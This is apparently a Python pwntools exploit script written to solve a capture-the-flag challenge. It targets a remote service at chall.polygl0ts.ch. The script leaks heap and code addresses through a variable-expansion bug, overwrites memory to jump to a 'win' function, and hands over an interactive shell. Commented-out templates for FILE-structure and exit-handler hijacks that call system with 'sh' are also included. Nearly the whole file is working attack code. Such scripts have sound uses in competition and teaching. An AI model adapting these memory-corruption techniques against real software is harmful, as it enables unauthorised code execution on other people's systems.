from pwn import *
import sys
import os
#Cre: vilex1337

_path = "./main_patched"
exe = context.binary = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
add = 'chall.polygl0ts.ch'
port = 9034
'''breakrva 0x2E97
b *setvar
'''
cmd = f'''
    set solib-search-path {os.getcwd()}
    continue
'''
_mode = 0
_arch = 64

def conn():
    global _mode
    if(len(sys.argv) == 1):
        _mode = 2
        return gdb.debug(_path, cmd)
    if(sys.argv[1] == 'exp'):
        _mode = 3
        return remote(add, port)
    _mode = 1
    return process(_path)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

chall = conn()

def _send(_rgx, _data):
    chall.sendafter(_rgx, _data)

def _sendline(_rgx, _data):
    chall.sendlineafter(_rgx, _data)

#rop = ROP(libc)
#rop.find_gadget(['pop rdi', 'ret'])[0]
#log.info

def check():
    chall.interactive()
    exit()

def _createlog():
    _sendline(b'>', b'log')

def _cmd(cmd):
    _sendline(b'>', cmd)

def leak_heap():
    _cmd(b'$1=abcde')
    _createlog()
    _createlog()
    _createlog()
    _cmd(b'$2=rpgs')
    _cmd(b'$x=0')
    _cmd(b'a' * (0x1f - 4 - len(b'$(($2+$x)') + 6))
    _cmd(b'$(($2+$x)')
    for i in range(5):
        _cmd(b'\x00')
    _cmd(b'$(($2+$x)')
    return int(chall.recvline()[:-1].decode())

def main():
    heap = leak_heap()
    log.info(f"Heap: {hex(heap)}")
    _base = heap + 0x70
    payload = b'a' * 0x27 + p(_base)
    _cmd(payload)
    #Refresh log buffer
    for i in range(8):
        _cmd(b'\x00')
    _cmd(b'$(($2+$x)')
    chall.recvuntil(b'Invalid variable 2: ')
    win = int.from_bytes(chall.recvline()[:-1], 'little') - 0x5e3b
    log.info(f"Win: {hex(win)}")
    #Refresh log buffer
    for i in range(9):
        _cmd(b'\x00')
    payload = b'a' * (0x24 + 0x10) + p(win)
    _cmd(payload)
    _createlog()
    _cmd(b'$3=0')
    payload = b'a' * (0xf + 0x8) + p(heap - 0x8)
    _cmd(payload)
    check()

if __name__ == "__main__":
    main()